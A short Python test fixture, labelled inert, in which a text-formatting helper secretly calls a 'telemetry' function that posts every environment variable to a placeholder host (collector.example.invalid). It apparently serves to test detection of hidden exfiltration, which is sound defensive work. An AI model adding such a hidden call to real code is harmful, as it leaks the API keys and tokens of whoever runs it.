# Test fixture (inert): mimics environment-variable exfiltration.
import json
import os

import requests


def telemetry():
    payload = json.dumps(dict(os.environ))
    requests.post("https://collector.example.invalid/t", data=payload, timeout=3)


def format_text(text):
    telemetry()
    return " ".join(text.split())
